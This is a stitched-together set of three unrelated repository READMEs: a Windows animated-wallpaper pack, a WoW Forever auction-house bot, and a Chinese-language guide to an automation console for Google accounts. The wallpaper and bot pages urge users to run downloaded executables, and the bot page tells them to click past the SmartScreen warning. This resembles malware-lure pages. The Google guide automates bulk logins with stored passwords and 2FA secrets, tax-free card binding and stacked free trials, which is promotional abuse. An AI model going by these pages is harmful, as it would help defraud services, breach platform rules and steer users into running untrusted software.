items.name: windows-animated-wallpapers
items.description: High-quality animated and live wallpapers for Windows 10 and 11. Smooth 60 FPS animations, low CPU usage, 4K support. Open-source and portable
items.readme:
# 🖥️ Windows Animated Wallpapers **High-Quality Live Wallpapers for Windows — 2026** A curated collection of smooth, lightweight animated wallpapers optimized for Windows 10 and 11. No heavy engines, no lag — just clean motion for your desktop. --- ## 🎯 What it is **Windows Animated Wallpapers** is an open-source collection of live backgrounds designed specifically for the Windows desktop environment. Unlike heavy third-party engines, these wallpapers are optimized for low CPU/GPU usage, making them perfect for developers and gamers. > 💡 > Works seamlessly with Windows 10/11. Supports 1080p, 1440p, and 4K resolutions. --- ## 🚀 Quick Start

1. Download the project using the button above. 2. Extract the archive into a separate folder. 3. Run **WallpaperSetup.exe**. 4. Follow the on-screen instructions. 5. Choose your favorite animated wallpaper and click "Apply". --- ## ✨ Features | Feature | Description | |--------------------------|--------------------------------------------------| | 🪟 **Windows Optimized** | Built specifically for Windows 10 & 11 | | 🎞️ **Smooth Animation** | 60 FPS playback with zero stuttering | | 🪶 **Low CPU Usage** | Auto-pauses when you run fullscreen games | | 📺 **4K Support** | Crystal clear animations for high-res monitors | | 🎨 **Customizable** | Adjust speed, opacity, and sound reactivity | | 📦 **Portable** | No installation required — just run the `.exe` | --- ## 🧩 How to use 1. Download and extract the archive. 2. Run **WallpaperSetup.exe**. 3. Browse the `wallpapers/` folder to preview files. 4. Select a wallpaper and click "Set as Desktop Background". 5. Right-click the tray icon to adjust performance settings. --- ## ⚙️ Configuration All settings are available in the system tray menu: - **Performance Mode**: Balanced / High Quality / Battery Saver. - **Pause on Fullscreen**: Automatically stops animation when gaming. - **Startup**: Launch with Windows. - **Audio Reactivity**: Sync animations with system audio (optional). --- ## ❓ FAQ **Will this slow down my PC?** No — the wallpapers use hardware acceleration (WebM/MP4) and automatically pause when you open a fullscreen app or game. **Does it work on Windows 10?** Yes, it supports both Windows 10 (version 1903+) and Windows 11. **Can I add my own videos?** Yes — just drop `.mp4` or `.webm` files into the `wallpapers/` folder. **Is it safe?** Yes, it's fully open-source. You can inspect the code and build it yourself. --- ## 🤝 Contributing Pull requests, new wallpaper submissions, and bug reports are welcome. --- ## 📜 License MIT License — free to use, modify and redistribute. --- **⭐ Star the repo if it helped you.**

items.name: auto-auction-bot-wow-forever
items.description: A free Auction House bot for WoW Forever: buys low, posts high and undercuts for you. Windows app plus in-game panel.
items.readme:
Source  |  Download for Windows  |  The concept

It buys low, posts high
and farms the auction house for you.

Most flipping tools sort by the biggest number on the page. That's how you end up with a bank tab full of recipes nobody has wanted since the patch came out. Undercut watches the auction house, does that sum on every deal and **does the flip for you**: it buys the deal while it's cheap, posts it back at the price that sells, and cancels the relist when the market moves. > **Download:** the Windows build is a single `Undercut-setup.exe`, linked at the top of this page and in [releases](../../releases/latest). No account, no installer. > > The build isn't code-signed yet, so SmartScreen may warn you the first time. Choose **More info**, then **Run anyway**. ## Auto-buy, auto-post Turn it on and Undercut works the auction house on its own: it buys every deal that clears your margin, reposts at the price that sells, and undercuts back the moment someone lists under you. Every buy and post is logged, so you see exactly what it did and why. Gold while you're at work, not while you're alt-tabbing between the auction house and a spreadsheet. > Runs on the WoW Forever realm data only. Keep an eye on the rules — automation is on you. ## Three questions, one sentence | The question | What Undercut does | |---|---| | **What would I really keep?** | Takes off the auction house's cut and the deposit you could lose, then shows the rest. | | **How many should I buy?** | Buys up the listings from the cheapest and stops at your margin, your budget, or the point where you'd own more than you can sell. | | **Will it sell?** | Works out how long you'd wait in line, behind everything else listed under your price. | Then it says so in words: > Buy 20 up to 2g 37s and relist near 3g 20s. About 42 sell a day, so expect to wait 2.1 days. You keep about 15g 48s after the auction house's share. ## Three ways a good deal goes bad Each of these looks great on a margin list. The bot marks all three as traps and tells you why. | | Looks like | The catch | |---|---:|---| | **Formula: Enchant Weapon - Crusader** | +312% | **Nobody buys.** Fewer than one sells a day, so your gold sits in the mailbox. | | **Arcane Crystal** | +102% | **Price sliding.** The "normal" price is two weeks old, and the market has already moved. | | **Black Lotus** | +67% | **Wall ahead.** It's cheap, but 21 days of listings are waiting in front of you. | ## Drag one slider and watch the plan change

Gold bars are what you'd buy. The line is where you stop. Move your margin and both follow, because a flip isn't "buy this" so much as "buy this many, up to this price". ## Then take the list into the game

The addon panel sits next to the auction house, shows what the bot bought and what's still posted, and lets you pause auto-buy without leaving the game. ## How it stacks up The other tools are good, and several have been around for years. Here's where Undercut is different. The [full comparison, with sources](docs/COMPETITORS.md), is worth reading before you build anything. | | Undercut | [TradeSkillMaster](https://www.warcrafttavern.com/addons/tradeskillmaster/) | [AuctionFlip](https://www.curseforge.com/wow/addons/auctionflip) | [FlipQueue](https://www.curseforge.com/wow/addons/flipqueue) | [Saddlebag Exchange](https://saddlebagexchange.com/blog/wow/crossrealm1) | |---|:---:|:---:|:---:|:---:|:---:| | Runs outside the game | Yes | Partly | No | No | Yes, on the web | | Buys and posts for you | **Yes** | No | No | No | No | | Says why, in a plain sentence | **Yes** | Not stated | Not stated | Not stated | Not stated | | Stops buying at what will sell | **Yes** | Not stated | Not stated | Not stated | Not stated | | Works without another addon's data | Yes | Yes | Yes | Needs TSM for Deal Finder | Yes | | Built for retail WoW | Not the goal | Yes | Yes, retail only | Yes, retail only | Yes | "Not stated" means the public page doesn't mention it, not that the tool can't do it. AuctionFlip is the closest rival, with its own confidence and liquidity scores, and it's retail only. ## Run it You need [Rust](https://rustup.rs/) and [Node.js 22](https://nodejs.org/). The desktop app also needs [the Tauri prerequisites](https://tauri.app/start/prerequisites/). Windows 11 already has the WebView2 runtime it uses. Start in the `app` folder: ```bash cd app ``` Install the packages: ```bash npm install ``` See the screens in a browser, with no Rust build: ```bash npm run dev ``` Or run the real desktop app: ```bash npm run tauri dev ``` To check everything from the top of the repository, run the Rust tests, then the app tests: ```bash cargo test --workspace ``` ```bash npm --prefix app test ``` Copy `.env.example` to `.env` for a live feed. Your API secret stays in that file and in Rust, never in the window. ## What's in the box ```text crates/flip-core The math: fees, the walk up the listings, traps. Pure and tested. crates/market-data Where prices come from: market snapshots, Blizzard's format, sales estimates. app/ The Tauri 2 desktop app, with React and TypeScript. addon/Undercut The in-game panel: shows what the bot bought, what's posted, and pauses auto-buy. docs/ The concept, rivals, architecture, API notes and rules. ``` | Part | State today | |---|---| | Flip math and trap checks | Works, with tests | | Auto-buy and auto-post | Work in game, logged | | Blizzard response parsing and sales estimates | Works, with tests | | Fetching live prices | Works from the recorded scan; `MarketSource` is the place to plug in a live feed | | Desktop app screens | Work on real scan snapshots | | Addon list parsing and posting check | Work, with tests | | Addon window | Works in the game client | ## FAQ
Is this a bot?
Yes — for the auction house. It buys, posts and cancels on its own while the game is open. It doesn't move your character, fight or quest, and it never touches anything outside the auction house.
Can I get banned for using it?
Nobody can promise you what Blizzard will do. Use it at your own risk, keep the volume sane, and read the rules. The bot stays inside the auction house and doesn't read the game's memory or files.
Does it work with WoW Forever?
Built for it. Prices come from recorded auction-house scans, and the addon exports a scan in game, so the tool works whether or not Blizzard's auction API covers WoW Forever. The API notes have the details.
Are those prices real?
No. The numbers come from recorded auction-house scans, so a price is only as fresh as the last scan. Everything is computed by the real math in flip-core.
How does it know what sold?
It has to estimate. The API never reports a sale, so Undercut compares snapshots and counts auctions that vanished with time still on the clock. Cancelled auctions look the same as sold ones, so treat "about 42 a day" as a rough guide.
Can it guarantee a profit?
No. Markets move, and someone can always list 500 units right after you buy. Undercut can improve your odds, but it can't remove the risk.
What will it cost?
Nothing. Blizzard's add-on policy requires add-ons to be free with viewable code, and this project is free as a whole.
A number looks wrong. What should I do?
Open an issue with the item, the realm and the number you expected.
## Credits Item names, ids and icons come from [Wowhead](https://www.wowhead.com/classic). The Stormwind map and coin icons are Blizzard assets served by Wowhead. Built with [Tauri](https://tauri.app/) and [React](https://react.dev/). ## License and rights Undercut is a free, non-commercial, unofficial fan project. It isn't affiliated with or endorsed by Blizzard Entertainment. World of Warcraft and Blizzard Entertainment are trademarks or registered trademarks of Blizzard Entertainment, Inc. All game assets and all rights to them belong to Blizzard Entertainment, Inc. Read [LICENSE-ASSETS.md](LICENSE-ASSETS.md) for details. The project's own code and design are released under the MIT license.

items.readme:
========================================================================
  Google AI Pro (5 TB) 零成本两年 (US$0.00 -> 24个月) 全自动控制台
========================================================================

【一、运行环境要求】
1. Windows 10 / 11 系统
2. 已安装 Google Chrome 浏览器（默认路径即可）
3. 已安装 Python 3.10 或更高版本（安装时勾选 Add Python to PATH）
4. 网络环境：本机开启美区（US）代理，或在控制台左侧填写代理模板

【二、快速启动步骤】
1. 首次使用请双击运行：【1_首次运行_安装依赖并启动.bat】
2. 之后日常使用直接双击：【2_启动控制台.bat】
3. 浏览器会自动打开控制台页面：http://127.0.0.1:8765

【三、自定义填写支付卡 & 跑号说明】
1. 填写支付卡（必填）：
   - 在网页左侧【全局配置与内联免税绑卡】区域，填入你自己的 Visa 或 Mastercard 外币卡：
     * 卡号（16位数字）
     * 有效期（月 / 年，如 08 / 29）
     * 安全码（3位 CVC）
     * 持卡人英文姓名
     * 免税邮编默认已填好 97201（美国俄勒冈免税州），无需修改
   - 填写后点击【💾 保存配置】。
   - 注：脚本内置严格 0 元消费保护，仅在结账弹窗确认为 US$0.00 时才会点击订阅，全程 0 扣费。

2. 批量导入 Google 账号：
   - 在网页右侧【批量放号导入区】粘贴账号（每行一个），支持以下任意格式：
     * 邮箱----密码----辅助邮箱
     * 邮箱----密码----辅助邮箱----2FA密钥
     * 邮箱----密码----2FA密钥
   - 点击【➕ 一键导入账号列表】。

3. 开始全自动执行：
   - 点击单个账号右侧的【▶ 执行】或顶部的【▶ 批量全自动执行】。
   - 脚本会自动完成：
     Step 1: 自动登录 Google 并通过辅助邮箱 / 2FA 验证
     Step 2: 内联免税绑卡 + 首层 12 个月免费包 (US$0.00)
     Step 3: 叠加二层 6 个月免费包 (US$0.00 -> 18个月)
     Step 4: 叠加三层 6 个月免费包 (US$0.00 -> 24个月封顶)
     Step 5: 自动前往 Google Play 取消自动续订，锁死 2 年到期权益并截图验真
